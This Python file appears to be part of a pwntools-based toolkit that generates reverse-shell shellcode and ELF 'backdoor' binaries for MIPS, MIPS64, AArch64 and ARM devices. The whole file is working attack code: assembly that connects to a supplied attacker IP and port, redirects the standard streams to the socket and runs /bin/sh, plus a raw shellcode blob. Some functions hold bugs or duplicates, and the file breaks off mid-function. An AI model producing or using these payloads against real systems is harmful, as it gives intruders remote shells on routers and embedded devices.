from . import extract_shellcode
from pwn import *

def mipsel_backdoor(reverse_ip,reverse_port,filename=None):
	context.arch='mips'
	context.endian='little'
	context.bits="32"
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	move $a0,$s0
	nor $a1,$zero,-1
	li  $v0,0xfdf
	syscall 0x40404
	move $a0,$s0
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	move $a0,$s0
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	ELF_data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	ELF_data=make_elf(ELF_data_shellcode)
	if filename==None:
		log.info("waiting 3s")
		sleep(3)
		filename="mipsel_backdoor"
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		log.success("mipsel_backdoor is ok in current path ./")
		context.arch='i386'
		context.bits="32"
		context.endian="little"

def aarch64_backdoor(reverse_ip,reverse_port,filename=None):
	context.arch='aarch64'
	context.endian='little'
	context.bits="64"
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode2='''
	mov x0,x12
	mov x1,#0
	mov x2,#0
	mov x8,#0x18
	svc #0x1337
	mov x0,x12
	mov x1,#1
	svc #1337
	mov x0,x12
	mov x1,#2
	svc #1337
	'''
	shellcode2=asm(shellcode2)
	shellcode3=asm(shellcraft.sh())
	all_reverseshell=basic_shellcode+shellcode2+shellcode3
	data=make_elf(all_reverseshell)
	if filename==None:
		filename="backdoor_aarch64"
		log.info("waiting 3s")
		sleep(3)
		f=open(filename,"wb")
		f.write(data)
		f.close()
		#print disasm(all_reverseshell)
		log.success("backdoor_aarch64 is ok in current path ./")
		context.arch='i386'
		context.bits="32"
		context.endian="little"

def aarch64_reverse_sl(reverse_ip,reverse_port):
	context.arch='aarch64'
	context.endian='little'
	context.bits="64"
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	handle_port="0x"+enhex(p16(reverse_port))
	handle_ip=list(reverse_ip.split('.'))
	handle_ip_high=hex((int(handle_ip[1])<<8)+int(handle_ip[0]))
	handle_ip_low=hex((int(handle_ip[3])<<8)+int(handle_ip[2]))
	shellcode='''
	mov x10,#0x100
	sub x0,x10,#0xfe
	sub x1,x10,#0xff
	mov x2,xzr
	mov x8,#0xc6
	svc #0x1337
	str x0,[sp,#-0x10]!
	ldr x12,[sp]
	sub x14,x10,#0xfe
	movk x14,#%s,lsl #16
	movk x14,#%s,lsl #32
	movk x14,#%s, lsl #48
	str x14, [sp,#-0x20]!
	add x11,sp,#0x100
	sub x1,x11,#0x100
	mov x2,#0x10
	mov x8,#0xcb
	svc #0x1337
	mov x0,x12
	mov x1,xzr
	mov x2,xzr
	mov x8,#0x18
	svc #0x1337
	mov x0,x12
	mov x10,#0x100
	sub x1,x10,#0xff
	svc #0x1337
	mov x0,x12
	sub x1,x10,#0xfe
	svc #0x1337
	mov     x14, #0x622f
	movk    x14, #0x6e69, lsl #16
	movk    x14, #0x732f, lsl #32
	movk    x14, #0x68, lsl #48
	str     x14, [sp, #-16]!
	add     sp,sp,#0x100
	sub     x0,sp,#0x100
	sub     sp,sp,#0x100
	mov     x14, #0x622f
	movk    x14, #0x6e69, lsl #16
	movk    x14, #0x732f, lsl #32
	movk    x14, #0x68, lsl #48
	str     x14, [sp, #-16]!
	mov     x14, xzr
	str     x14, [sp, #-0x10]!
	mov     x14, #0x10
	mov     x2, xzr
	add     x14, sp, x14
	stp     x2,x14,[sp,#-0x30]!
	add     sp,sp,#0x100
	sub     x1,sp,#0xf8
	sub     sp,sp,#0x100
	mov     x8, #0xdd 
	svc     #0x1337
	'''
	shellcode=shellcode%(handle_port,handle_ip_high,handle_ip_low)
	shellcode=asm(shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	shellcode_len=len(shellcode)
	if "\\x00" in shellcode_hex:
		log.info("waiting 3s")
		sleep(3)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%int(shellcode.index("\x00")))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode
	else:
		log.info("waiting 3s")
		sleep(3)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode


def armelv7_backdoor(reverse_ip,reverse_port,filename=None):
	context.arch='arm'
	context.endian='little'
	context.bits="32"
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode2='''
	mov r5,r6
	mov r0,r5
	mov r1,#0
	movw r7,#0x3f
	svc #0
	mov r0,r5
	mov r1,#1
	svc #0
	mov r0,r5
	mov r1,#2
	svc #0
	'''
	shellcode2=asm(shellcode2)
	shellcode3=asm(shellcraft.sh())
	all_reverseshell=basic_shellcode+shellcode2+shellcode3
	data=make_elf(all_reverseshell)
	if filename==None:
		log.info("waiting 3s")
		sleep(3)
		filename="backdoor_armelv7"
		f=open(filename,"wb")
		f.write(data)
		f.close()
		#print disasm(all_reverseshell)
		log.success("backdoor_armelv7 is ok in current path ./")
		context.arch='i386'
		context.bits="32"
		context.endian="little"

def armelv7_reverse_sl(reverse_ip,reverse_port):
	context.arch='arm'
	context.endian='little'
	context.bits="32"
	shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r0,r1}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	handle_ip=reverse_ip.split('.')
	handle_port=list(p16(reverse_port)[::-1])
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	shellcode=asm(shellcode)[:-2]
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	shellcode_len=len(shellcode)
	if "\\x00" in shellcode_hex:
		log.info("waiting 3s")
		sleep(3)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		#print shellcode.index("\x00")
		log.info("the null byte in %d"%(int(shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode

	else:
		log.info("waiting 3s")
		sleep(3)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		return shellcode



def armelv5_backdoor(reverse_ip,reverse_port,filename=None):
	context.bits="32"
	context.arch='arm'
	context.endian='little'
	shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r0,r1}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+str(reverse_port))
	handle_ip=reverse_ip.split('.')
	handle_port=list(p16(reverse_port)[::-1])
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	shellcode=asm(shellcode)[:-2]
	data = make_elf(shellcode)
	if filename==None:
		filename="backdoor_armelv5"
		f=open(filename,"wb")
		f.write(data)
		f.close()
		log.info("waiting 3s")
		sleep(3)
		#print disasm(all_reverseshell)
		log.success("backdoor_armelv5 is ok in current path ./")
		context.arch='i386'
		context.bits="32"
		context.endian="little"

def armelv5_reverse_sl(reverse_ip,reverse_port):
	context.bits="32"
	context.arch='arm'
	context.endian='little'
	shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r0,r1}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+ str(reverse_port))
	handle_ip=reverse_ip.split('.')
	handle_port=list(str(reverse_port)[::-1])
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	shellcode=asm(shellcode)[:-2]
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	shellcode_len=len(shellcode)
	if "\\x00" in shellcode_hex:
		log.info("waiting 3s")
		sleep(3)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%(int(shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		print(shellcode_hex)
		return shellcode
	else:
		log.info("waiting 3s")
		sleep(3)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		print(shellcode_hex)
		return shellcode

def armebv7_reverse_sl(reverse_ip,reverse_port):
	context.bits="32"
	context.arch='arm'
	context.endian='big'
	shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r0,r1}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+ strreverse_port)
	handle_ip=reverse_ip.split('.')[::-1]
	handle_port=list(str(reverse_port))
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	shellcode=asm(shellcode)[:-2]
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	shellcode_len=len(shellcode)
	if "\\x00" in shellcode_hex:
		sleep(3)
		log.info("waiting 3s")
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.success("the null byte in %d"%int(shellcode.index("\x00")))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		#return shellcode
	else:
		log.info("waiting 3s")
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode

def armebv5_reverse_sl(reverse_ip,reverse_port):
	context.bits="32"
	context.arch='arm'
	context.endian='big'
	shellcode='''
	.ARM
	eor r4,r4,r4
	%s
	strb r7,[sp,#-0x28]
	%s
	strb r7,[sp,#-0x27]
	%s
	strb r7,[sp,#-0x26]
	%s
	strb r7,[sp,#-0x25]
	mov r7,#2
	strb r7,[sp,#-0x29]
	strb r4,[sp,#-0x2a]
	%s
	strb r7,[sp,#-0x2b]
	%s
	strb r7,[sp,#-0x2c]
	strb r4,[sp,#-0x14]
	mov r7,#0x68
	strb r7,[sp,#-0x15]
	mov r7,#0x73
	strb r7,[sp,#-0x16]
	mov r7,#0x2f
	strb r7,[sp,#-0x17]
	mov r7,#0x6e
	strb r7,[sp,#-0x18]
	mov r7,#0x69
	strb r7,[sp,#-0x19]
	mov r7,#0x62
	strb r7,[sp,#-0x1a]
	mov r7,#0x2f
	strb r7,[sp,#-0x1b]
	add r4,sp,#-0x1b
	add r5,sp,#-0x2c
	add r3,pc,#1
	bx  r3
	.THUMB
	mov r1,#2
	mov r0,r1
	mov r1,#1
	eor r2,r2,r2
	mov r7,#200
	add r7,r7,#81
	svc #1
	mov r6,r0
	mov r1,r5
	mov r2,#0x10
	add r7,r7,#2
	svc #1
	mov r0,r6
	eor r1,r1,r1
	mov r7,#63
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r6
	add r1,r1,#1
	svc #1
	mov r0,r4
	eor r1,r1,r1
	eor r2,r2,r2
	push {r0,r1}
	mov r1,sp
	mov r7,#0xb
	svc #1
	'''
	log.success("reverse_ip is set to "+ reverse_ip)
	log.success("reverse_port is set to "+ str(reverse_port))
	handle_ip=reverse_ip.split('.')[::-1]
	handle_port=list(str(reverse_port))
	for i in range(len(handle_ip)):
		if handle_ip[i]!="0":
			handle_ip[i]="mov r7,#"+handle_ip[i]
		else:
			handle_ip[i]="eor r7,r7,r7"
	for i in range(len(handle_port)):
		if handle_port[i]!="\x00":
			handle_port[i]="mov r7,#"+str(handle_port[i])
		else:
			handle_port[i]="eor r7,r7,r7"

	shellcode=shellcode%(handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3],handle_port[0],handle_port[1])
	#print shellcode
	#str(u8(handle_port[0])),str(u8(handle_port[1])
	#handle_ip[0],handle_ip[1],handle_ip[2],handle_ip[3]
	shellcode=asm(shellcode)[:-2]
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(shellcode,shellcode_hex)
	shellcode_len=len(shellcode)
	if "\\x00" in shellcode_hex:
		log.info("waiting 3s")
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%int(shellcode.index("\x00")))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode
	else:
		log.info("waiting 3s")
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return shellcode

def armebv7_backdoor(reverse_ip,reverse_port,filename=None):
	context.bits="32"
	context.arch='arm'
	context.endian='big'
	basic_shellcode=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode2='''
	mov r5,r6
	mov r0,r5
	mov r1,#0
	movw r7,#0x3f
	svc #0
	mov r0,r5
	mov r1,#1
	svc #0
	mov r0,r5
	mov r1,#2
	svc #0
	'''
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shellcode2=asm(shellcode2)
	shellcode3=asm(shellcraft.sh())
	all_reverseshell=basic_shellcode+shellcode2+shellcode3
	data=make_elf(all_reverseshell)
	log.info("waiting 3s")
	sleep(3)
	if filename==None:
		filename="backdoor_armv7"
		f=open(filename,"wb")
		f.write(data)
		f.close()
		#print disasm(all_reverseshell)
		log.success("backdoor_armv7 is ok in current path ./")
		context.arch='i386'
		context.bits="32"
		context.endian="little"

'''
def armebv5_backdoor(reverse_ip,reverse_port,filename=None):
	context.bits="32"
	context.arch='arm'
	context.endian='big'
	reverse_port=p16(reverse_port)[::-1]
	reverse_ip=reverse_ip.split(".")
	reverse_ip_new=b''
	for i in range(4):
		reverse_ip_new+=p8(int(reverse_ip[i]))
	shellcode  = b'\x01\x30\x8F\xE2\x13\xFF\x2F\xE1\x02\x20\x01\x21\x52\x40\x64\x27'
	shellcode += b'\xB5\x37\x01\xDF\x04\x1C\x0D\xA1\x4A\x70\x10\x22\x02\x37\x01\xDF'
	shellcode += b'\x20\x1C\x49\x40\x3F\x27\x01\xDF\x20\x1C\x01\x31\x01\xDF\x20\x1C'
	shellcode += b'\x01\x31\x01\xDF\x03\xA0\x52\x40\xC2\x71\x05\xB4\x69\x46\x0B\x27'
	shellcode += b'\x01\xDF\x7F\x40\x2F\x62\x69\x6E\x2F\x73\x68\x41\x02\xAA'
	shellcode += reverse_port
	shellcode += reverse_ip_new
	data = make_elf(shellcode)
	if filename==None:
		filename="backdoor_armebv5"
		f=open(filename,"wb")
		f.write(data)
		f.close()
		#print disasm(all_reverseshell)
		print("backdoor_armebv5 is ok in current path ./")
		context.arch='i386'
		context.bits="32"
		context.endian="little"
'''

def mipsel_backdoor(reverse_ip,reverse_port,filename=None):
	context.arch='mips'
	context.endian='little'
	context.bits="32"
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	move $a0,$s0
	nor $a1,$zero,-1
	li  $v0,0xfdf
	syscall 0x40404
	move $a0,$s0
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	move $a0,$s0
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	ELF_data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	ELF_data=make_elf(ELF_data_shellcode)
	log.info("waiting 3s")
	sleep(3)
	if filename==None:
		filename="mipsel_backdoor"
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		log.success("mipsel_backdoor is ok in current path ./")
		context.arch='i386'
		context.bits="32"
		context.endian="little"

def mips_backdoor(reverse_ip,reverse_port,filename=None):
	context.arch='mips'
	context.endian='big'
	context.bits="32"
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	nor $a1,$zero,-1
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	ELF_data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	ELF_data=make_elf(ELF_data_shellcode)
	log.info("waiting 3s")
	sleep(3)
	if filename==None:
		filename="mips_backdoor"
		f=open(filename,"wb")
		f.write(ELF_data)
		f.close()
		log.success("mips_backdoor is ok in current path ./")
		context.arch='i386'
		context.bits="32"
		context.endian="little"


def mipsel_reverse_sl(reverse_ip,reverse_port):
	context.arch='mips'
	context.endian='little'
	context.bits="32"
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	xor $t2,$t2
	move $a1,$t2
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	shellcode_len=len(data_shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(data_shellcode,shellcode_hex)
	if "\\x00" in shellcode_hex:
		log.info("waiting 3s")
		sleep(3)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%(int(data_shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return data_shellcode
	else:
		log.info("waiting 3s")
		sleep(3)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return data_shellcode

def mips_reverse_sl(reverse_ip,reverse_port):
	context.arch='mips'
	context.bits="32"
	context.endian='big'
	shellcode_connect=asm(shellcraft.connect(reverse_ip,reverse_port))
	shellcode_dump_sh='''
	xor $t2,$t2
	move $a1,$t2
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-2
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	li  $t9,-3
	nor $a1,$t9,$zero
	li  $v0,0xfdf
	syscall 0x40404
	'''
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	shellcode_dump_sh=asm(shellcode_dump_sh)
	shellcode_execve=asm(shellcraft.execve("/bin/sh",["/bin/sh"],0))
	data_shellcode=shellcode_connect+shellcode_dump_sh+shellcode_execve
	shellcode_len=len(data_shellcode)
	shellcode_hex=''
	shellcode_hex=extract_shellcode.extract_sl_print(data_shellcode,shellcode_hex)
	if "\\x00" in shellcode_hex:
		log.info("waiting 3s")
		sleep(3)
		log.info("pay attaction NULL byte in shellcode(len is {})".format(shellcode_len))
		log.info("the null byte in %d"%(int(data_shellcode.index(b"\x00"))))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return data_shellcode
	else:
		log.info("waiting 3s")
		sleep(3)
		log.success("No NULL byte shellcode for hex(len is {}):".format(shellcode_len))
		print(shellcode_hex)
		context.arch='i386'
		context.bits="32"
		context.endian="little"
		return data_shellcode

def mips64el_backdoor(reverse_ip,reverse_port,filename=None):
	'''
	socket number v0=0x13b0
	connect number v0=0x13b1
	dup2  number v0=0x13A8
	execve number v0=0x13c1
	:param reverse_ip:
	:param reverse_port:
	:param filename:
	:return:
	'''
	log.success("reverse_ip is: "+ reverse_ip)
	log.success("reverse_port is: "+str(reverse_port))
	reverse_port=int(hex(reverse_port),16)
	reverse_port=hex(0x10000-int("0x"+enhex(p16(reverse_port)),16)-1)
	reverse_ip=list(reverse_ip.split("."))
	reverse_ip_high=hex(0x10000-((int(reverse_ip[1])<<8)+int(reverse_ip[0]))-1)
	#print(reverse_ip_high)
	#print((int(reverse_ip[1])<<8)+int(reverse_ip[0]))
	#print(reverse_ip_high)
	reverse_ip_low=hex(0x10000-((int(reverse_ip[3])<<8)+int(reverse_ip[2]))-1)
	#print(reverse_ip_low)
	context.arch='mips64'
	context.bits="64"
	context.endian='little'
	shellcode_connect='''
	li      $t9, -3
	nor     $a0, $t9, $zero
	li      $t9, -3
	nor     $a1, $t9, $zero
	slti    $a2, $zero, -1
	li      $v0, 0x13b0
	syscall 0x40404
	sw      $v0, -4($sp)
	lw      $s0, -4($sp)
	lui     $t9, %s
	ori     $t9, $t9, 0xfffd
	nor     $t1, $t9, $zero
	sw      $t1, -8($sp)
	lui     $t9, %s
	ori     $t9, $t9, %s
	nor     $t1, $t9, $zero
	sw      $t1, -4($sp)
	daddiu  $sp, $sp, -8
	sw      $s0, -4($sp)
	lw      $a0, -4($sp)
	move     $a1,$sp
	li      $t9, -17
	nor     $a2, $t9, $zero
	li      $v0, 0x13b1
	syscall 0x40404
	'''
	shellcode_connect=shellcode_connect%(reverse_port,reverse_ip_low,reverse_ip_high)
	shellcode_dup_sh='''
	move $a0,$s0
	nor $a1,$zero,-1
	li  $v0,0x13A8
	syscall 0x40404
	move $a0,$s0
